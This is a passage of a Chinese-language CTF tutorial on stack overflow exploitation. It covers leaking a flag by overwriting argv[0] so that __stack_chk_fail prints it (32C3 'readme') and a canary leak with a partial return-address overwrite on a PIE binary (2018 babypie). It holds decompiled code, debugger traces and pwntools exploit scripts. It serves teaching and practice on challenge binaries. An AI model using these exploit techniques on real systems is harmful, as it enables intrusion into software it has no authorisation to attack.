\u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b void __attribute__ ((noreturn)) __stack_chk_fail (void) { __fortify_fail (\"stack smashing detected\"); } void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) { /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"<unknown>\"); } \u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6 argv[0] \u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728 __fortify_fail \u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002 32C3 CTF readme \u00b6 \u8be5\u9898\u76ee\u5728 jarvisoj \u4e0a\u6709\u590d\u73b0\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a 64 \u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4ee5\u53ca NX \u4fdd\u62a4\uff0c\u4ee5\u53ca FORTIFY \u4fdd\u62a4\u3002 Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u5206\u6790\u7a0b\u5e8f \u00b6 ida \u770b\u4e00\u4e0b __int64 sub_4007E0() { __int64 v0; // rax@1 __int64 v1; // rbx@2 int v2; // eax@3 __int64 v4; // [sp+0h] [bp-128h]@1 __int64 v5; // [sp+108h] [bp-20h]@1 v5 = *MK_FP(__FS__, 40LL); __printf_chk(1LL, (__int64)\"Hello!\\nWhat's your name? \"); LODWORD(v0) = _IO_gets((__int64)&v4); if ( !v0 ) LABEL_9: _exit(1); v1 = 0LL; __printf_chk(1LL, (__int64)\"Nice to meet you, %s.\\nPlease overwrite the flag: \"); while ( 1 ) { v2 = _IO_getc(stdin); if ( v2 == -1 ) goto LABEL_9; if ( v2 == '\\n' ) break; byte_600D20[v1++] = v2; if ( v1 == ' ' ) goto LABEL_8; } memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1)); LABEL_8: puts(\"Thank you, bye!\"); return *MK_FP(__FS__, 40LL) ^ v5; } _IO_gets((__int64)&v4) \u5b58\u5728\u6808\u6ea2\u51fa\u3002 \u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981 overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728 while \u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5 memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1)); \u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684 flag \u5c31\u5728\u8fd9\u91cc\u3002 .data:0000000000600D20 ; char aPctfHereSTheFl[] .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0 \u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9 byte_600D20[v1++] = v2; \u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86 \u5728 ELF \u5185\u5b58\u6620\u5c04\u65f6\uff0cbss \u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa \uff0c\u53ef\u4ee5\u4f7f\u7528 gdb \u7684 find \u6765\u8fdb\u884c\u67e5\u627e\u3002 \u786e\u5b9a flag \u5730\u5740 \u00b6 \u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7d memset \u51fd\u6570\uff080x400873\uff09\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b pwndbg> b *0x400873 Breakpoint 1 at 0x400873 pwndbg> r Starting program: /home/skye/readme.bin Hello! What 's your name? aaaaaaaa Nice to meet you, aaaaaaaa. Please overwrite the flag: bbbbbbbb Breakpoint 1, 0x0000000000400873 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0xa RBX 0x8 RCX 0x7ffff7b04260 (__read_nocancel+7) \u25c2\u2014 cmp rax, -0xfff RDX 0x18 # flag \u5b58\u653e\u5730\u5740 RDI 0x600d28 \u25c2\u2014 ' ServerHasTheFlagHere... ' RSI 0x0 R8 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 R9 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 R10 0x814 R11 0x246 R12 0x4006ee \u25c2\u2014 xor ebp, ebp R13 0x7fffffffdd70 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0x4008b0 \u25c2\u2014 push r15 RSP 0x7fffffffdb60 \u25c2\u2014 ' aaaaaaaa ' RIP 0x400873 \u25c2\u2014 call 0x400670 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u25ba 0x400873 call memset@plt <0x400670> # flag \u5b58\u653e\u5730\u5740 s: 0x600d28 \u25c2\u2014 ' ServerHasTheFlagHere... ' c: 0x0 n: 0x18 0x400878 mov edi, 0x40094e 0x40087d call puts@plt <0x400640> 0x400882 mov rax, qword ptr [rsp + 0x108] 0x40088a xor rax, qword ptr fs:[0x28] 0x400893 jne 0x4008a9 0x400895 add rsp, 0x118 0x40089c pop rbx 0x40089d pop rbp 0x40089e ret 0x40089f mov edi, 1 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 # name \u5b58\u653e\u5730\u5740 00:0000\u2502 rsp 0x7fffffffdb60 \u25c2\u2014 ' aaaaaaaa ' 01 :0008\u2502 0x7fffffffdb68 \u2014\u25b8 0x7ffff7ffd900 ( _rtld_global+2240 ) \u25c2\u2014 0x0 02 :0010\u2502 0x7fffffffdb70 \u2014\u25b8 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 03 :0018\u2502 0x7fffffffdb78 \u25c2\u2014 0x0 04 :0020\u2502 0x7fffffffdb80 \u2014\u25b8 0x7ffff7ffea88 \u2014\u25b8 0x7ffff7ffe9b8 \u2014\u25b8 0x7ffff7ffe728 \u2014\u25b8 0x7ffff7ffe700 \u25c2\u2014 ... 05 :0028\u2502 0x7fffffffdb88 \u2014\u25b8 0x7fffffffdbc0 \u25c2\u2014 0x2 06 :0030\u2502 0x7fffffffdb90 \u25c2\u2014 0x380 07 :0038\u2502 0x7fffffffdb98 \u2014\u25b8 0x7fffffffdbb0 \u25c2\u2014 0xffffffff \u4ece 18 \u884c\u6216 33 \u884c\u53ef\u4ee5\u5f97\u51fa flag \u5b58\u653e\u5730\u5740\u4e3a\uff1a0x600d28 \u3002\u53e6\u5916\u4e00\u4e2a bss \u6bb5\u5185\u7684 flag \u5730\u5740\u4f7f\u7528 peda find \u529f\u80fd\u67e5\u627e\uff0c\u4e24\u4e2a flag \u5730\u5740\u5206\u522b\u4e3a\uff1a 0x600d28 \u30010x400d28\u3002 \u8fd9\u91cc\u9700\u8981\u51cf\u53bb\u504f\u79fb\uff08\u88ab name \u8986\u76d6\u4e86 0x7 \uff09\u624d\u80fd\u5f97\u5230\u5b8c\u6574 flag \uff0c\u6240\u4ee5\u4e24\u4e2a flag \u5730\u5740\u4e3a\uff1a0x600d21 \u30010x400d21 gdb-peda$ find Serv Searching for 'Serv' in : None ranges Found 6 results, display max 6 items: readme.bin : 0x400d28 ( \"ServerHasTheFlagHere...\" ) readme.bin : 0x600d28 ( \"ServerHasTheFlagHere...\" ) libc : 0x7ffff7b97641 ( \"Servname not supported for ai_socktype\" ) libc : 0x7ffff7b9924c ( \"Server rejected credential\" ) libc : 0x7ffff7b9927f ( \"Server rejected verifier\" ) libc : 0x7ffff7b994af ( \"Server can't decode arguments\" ) \u786e\u5b9a\u504f\u79fb \u00b6 \u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9a argv[0] \u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002 \u9996\u5148\u4e0b\u65ad\u70b9\u5728 main \u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b gef\u27a4 b *0x00000000004006D0 Breakpoint 1 at 0x4006d0 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes Breakpoint 1 , 0x00000000004006d0 in ?? () code:i386:x86-64 ] \u2500\u2500\u2500\u2500 0x4006c0 <_IO_gets@plt+0> jmp QWORD PTR [ rip+0x20062a ] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 <_IO_gets@plt+6> push 0x9 0x4006cb <_IO_gets@plt+11> jmp 0x400620 \u2192 0x4006d0 sub rsp, 0x8 0x4006d4 mov rdi, QWORD PTR [ rip+0x200665 ] # 0x600d40 <stdout> 0x4006db xor esi, esi 0x4006dd call 0x400660 <setbuf@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0x7fffffffdb78' , 'l8' ] 8 0x00007fffffffdb78\u2502+0x00: 0x00007ffff7a2d830 \u2192 <__libc_start_main+240> mov edi, eax \u2190 $rsp 0x00007fffffffdb80\u2502+0x08: 0x0000000000000000 0x00007fffffffdb88\u2502+0x10: 0x00007fffffffdc58 \u2192 0x00007fffffffe00b \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]\" 0x00007fffffffdb90\u2502+0x18: 0x0000000100000000 0x00007fffffffdb98\u2502+0x20: 0x00000000004006d0 \u2192 sub rsp, 0x8 0x00007fffffffdba0\u2502+0x28: 0x0000000000000000 0x00007fffffffdba8\u2502+0x30: 0x48c916d3cf726fe3 0x00007fffffffdbb0\u2502+0x38: 0x00000000004006ee \u2192 xor ebp, ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x4006d0 \u2192 sub rsp, 0x8 [ #1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48) ---Type < return > to continue , or q < return > to quit--- [ #2] 0x400717 \u2192 hlt \u53ef\u4ee5\u770b\u51fa 0x00007fffffffe00b \u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662f argv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f6 0x00007fffffffdc58 \u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u662f 0x00007fffffffdc58 \u7684\u503c\u3002 argv[0] \u8bfb\u5165\u65b9\u5f0f\u770b 16 \u884c\uff0c\u7cfb\u7edf\u5230 0x00007fffffffdc58 \u627e\u5230\u5730\u5740\uff0c\u7136\u540e\u53d6\u5730\u5740\u7684\u503c\u3002 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x7fffffffdda8 \u2014\u25b8 0x400d21 \u25c2\u2014 xor al, byte ptr [ rbx + 0x33 ] /* '2C3_TheServerHasTheFlagHere...' */ RBX 0x1 RCX 0x0 RDX 0x7ffff7b9c481 \u25c2\u2014 jae 0x7ffff7b9c4f7 /* 'stack smashing detected' */ RDI 0x1 RSI 0x7ffff7b9c49f \u25c2\u2014 sub ch, byte ptr [ rdx ] /* '*** %s ***: %s terminated\\n' */ \u2026\u2026 RBP 0x7ffff7b9c481 \u25c2\u2014 jae 0x7ffff7b9c4f7 /* 'stack smashing detected' */ RSP 0x7fffffffdb60 \u25c2\u2014 0x4 RIP 0x7ffff7b2614b ( __fortify_fail+75 ) \u25c2\u2014 mov rcx, qword ptr [ rax ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2026\u2026 0x7ffff7b26146 <__fortify_fail+70> mov rdx, rbp 0x7ffff7b26149 <__fortify_fail+73> mov edi, ebx \u25ba 0x7ffff7b2614b <__fortify_fail+75> mov rcx, qword ptr [ rax ] \u2026\u2026 \u5269\u4e0b\u5c31\u662f\u627e\u5230\u6ea2\u51fa\u70b9\u5199\u5165\u5b57\u7b26\u4e32\u7684\u6808\u5730\u5740\uff0c\u5728 \u786e\u5b9a flag \u5730\u5740 \u4e2d\u7684\u7b2c\u4e00\u4e2a\u8c03\u8bd5\u4e2d\u7684 53 \u884c\u627e\u5230 name \u5b58\u653e\u5730\u5740\uff1a0x7fffffffdb60 \u5229\u7528\u7a0b\u5e8f \u00b6 from pwn import * context . log_level = 'debug' p = process ( \"./readme.bin\" ) flag1 = 0x600d21 flag2 = 0x400d21 argv0 = 0x7fffffffdd78 name = 0x7fffffffdb60 #0x7fffffffdca8 payload = 'a' * ( argv0 - name ) payload += p64 ( flag2 ) p . recvuntil ( \"name? \" ) gdb . attach ( p ) p . sendline ( payload ) p . recvuntil ( \"flag: \" ) p . sendline ( \"skye\" ) data = p . recv () p . interactive () \u6808\u4e0a\u7684 partial overwrite \u00b6 partial overwrite \u8fd9\u79cd\u6280\u5de7\u5728\u5f88\u591a\u5730\u65b9\u90fd\u9002\u7528, \u8fd9\u91cc\u5148\u4ee5\u6808\u4e0a\u7684 partial overwrite \u4e3a\u4f8b\u6765\u4ecb\u7ecd\u8fd9\u79cd\u601d\u60f3\u3002 \u6211\u4eec\u77e5\u9053, \u5728\u5f00\u542f\u4e86\u968f\u673a\u5316\uff08ASLR\uff0cPIE\uff09\u540e, \u65e0\u8bba\u9ad8\u4f4d\u7684\u5730\u5740\u5982\u4f55\u53d8\u5316\uff0c\u4f4e 12 \u4f4d\u7684\u9875\u5185\u504f\u79fb\u59cb\u7ec8\u662f\u56fa\u5b9a\u7684, \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u80fd\u66f4\u6539\u4f4e\u4f4d\u7684\u504f\u79fb, \u5c31\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41, \u7ed5\u8fc7 PIE \u4fdd\u62a4\u3002 \u66f4\u5168\u9762\u7684 PIE \u4fdd\u62a4\u7ed5\u8fc7\u770b\u841d\u535c\u5e08\u5085\u7684\uff1a PIE\u4fdd\u62a4\u8be6\u89e3\u548c\u5e38\u7528bypass\u624b\u6bb5 2018 - \u5b89\u6052\u676f - babypie \u00b6 \u4ee5\u5b89\u6052\u676f 2018 \u5e74 7 \u6708\u6708\u8d5b\u7684 babypie \u4e3a\u4f8b\u5206\u6790\u8fd9\u4e00\u79cd\u5229\u7528\u6280\u5de7, \u9898\u76ee\u7684 binary \u653e\u5728\u4e86 ctf-challenge \u4e2d \u4fdd\u62a4 \u00b6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u5206\u6790\u7a0b\u5e8f \u00b6 \u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e, \u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u8f93\u5165\u4e4b\u524d, \u7a0b\u5e8f\u5bf9\u6808\u7a7a\u95f4\u8fdb\u884c\u4e86\u6e05\u96f6, \u8fd9\u6837\u6211\u4eec\u5c31\u65e0\u6cd5\u901a\u8fc7\u6253\u5370\u6808\u4e0a\u4fe1\u606f\u6765 leak binary \u6216\u8005 libc \u7684\u57fa\u5740\u4e86 __int64 sub_960() { __int128 name; // [rsp+0h] [rbp-30h] __int128 v2; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(_bss_start, 0LL, 2, 0LL); name = 0uLL; v2 = 0uLL; puts(\"Input your Name:\"); read(0, &name, 0x30uLL); // \u6808\u6ea2\u51fa printf(\"Hello %s:\\n\", &name, name, v2); read(0, &name, 0x60uLL); // \u6808\u6ea2\u51fa return 0LL; } \u7a0b\u5e8f\u6709\u7559\u6709\u540e\u95e8 sub_A3E \u3002 \u601d\u8def \u00b6 \u6cc4\u9732 libc \u5730\u5740\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u5c06\u6808\u4e0a\u6700\u8fd1\u7684 libc \u5730\u5740\u524d\u7684 \\x00 \u8986\u76d6\u6389\u3002\u800c\u6700\u8fd1\u7684 libc \u5730\u5740\uff08__libc_start_main+240\uff09\u9700\u8981\u8986\u76d6 0x58 \uff0c\u663e\u7136\u6ea2\u51fa\u957f\u5ea6\u4e0d\u591f\u3002 \u6240\u4ee5\u9009\u62e9\u63a7\u5236 rip \u8df3\u8f6c\u5230\u540e\u95e8\u51fd\u6570\u3002\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \u548c Canary \u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u9996\u5148\u662f\u6cc4\u9732\u51fa canary \u503c\uff0c\u7136\u540e\u518d\u6b21\u6808\u6ea2\u51fa\u63a7\u5236 rip \u8df3\u8f6c\u3002 leak canary \u00b6 sub_960 \u6808\u7ed3\u6784\u5728 ida \u4e2d\u5206\u6790\u5982\u4e0b\uff1a 0000000000000030 name xmmword ? -0000000000000020 var_20 xmmword ? -0000000000000010 db ? ; undefined -000000000000000F db ? ; undefined -000000000000000E db ? ; undefined -000000000000000D db ? ; undefined -000000000000000C db ? ; undefined -000000000000000B db ? ; undefined -000000000000000A db ? ; undefined -0000000000000009 db ? ; undefined -0000000000000008 var_8 dq ? +0000000000000000 s db 8 dup(?) +0000000000000008 r db 8 dup(?) \u5728\u7b2c\u4e00\u4e2a\u8f93\u5165 name \u65f6\uff0c\u53ef\u4ee5\u5199\u5165 0x29 \u5b57\u8282\uff0c\u8f93\u51fa\u540d\u5b57\u65f6\u4f1a\u5c06 canary \u4e5f\u4e00\u8d77\u8f93\u51fa\u3002 payload = 'a' * ( 0x30 - 0x8 + 1 ) p . recvuntil ( \"Name: \\n \" ) p . send ( payload ) p . recvuntil ( 'a' * ( 0x30 - 0x8 + 1 )) canary = u64 ( p . recv ( 7 ) . rjust ( 8 , ' \\x00 ' )) log . info ( \"canary:\" + hex ( canary )) partial overwrite \u00b6 \u867d\u7136\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \uff0c\u4f46\u662f\u7531\u4e8e\u4f4e 12 \u4f4d\u7684\u9875\u5185\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u4e5f\u5c31 ida \u4e2d\u80fd\u770b\u5230\u7684\u90e8\u5206\uff0c\u8fd9\u6761\u9898\u5c31\u662f\u4f4e\u4e09\u4f4d\u3002 \u540e\u95e8\u51fd\u6570\u7684\u5730\u5740\u4e3a\uff1a0xA3E\u3002\u7531\u4e8e\u8f93\u5165\u7684\u65f6\u5019\u662f\u4e00\u4e2a\u5b57\u8282\uff0c\u4e5f\u5c31\u662f 0x3E \u8fd9\u6837\u8f93\u5165\uff0c\u4f46\u662f\u7b2c 4 \u4e2a\u6570\u5b57\u662f\u968f\u673a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u627e\u4e00\u4e2a**\u8df3\u8f6c text \u6bb5**\u3001**\u7b2c\u4e09\u4f4d\u662f A **\u7684rip \u8fdb\u884c\u8986\u76d6\u3002 \u6211\u4eec\u5199\u5165 name \u7684\u51fd\u6570\u8fd0\u884c\u7ed3\u675f\u540e\u4f1a\u8fd4\u56de main \u51fd\u6570\uff0cmain \u51fd\u6570\u5728 text \u6bb5(\uff080x555555554a3e\uff09\uff1a pwndbg> 0x0000555555554a3d in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ REGISTERS ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RAX 0x0 RBX 0x0 RCX 0x0 RDX 0x60 RDI 0x0 RSI 0x7fffffffdc80 \u25c2\u2014 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' R8 0x7ffff7fdd700 \u25c2\u2014 0x7ffff7fdd700 R9 0x3e R10 0x36 R11 0x346 R12 0x555555554830 \u25c2\u2014 xor ebp, ebp R13 0x7fffffffddb0 \u25c2\u2014 0x1 R14 0x0 R15 0x0 RBP 0xdeadbeef RSP 0x7fffffffdcb8 \u2014\u25b8 0x555555554a3e \u25c2\u2014 push rbp RIP 0x555555554a3d \u25c2\u2014 ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ DISASM ] 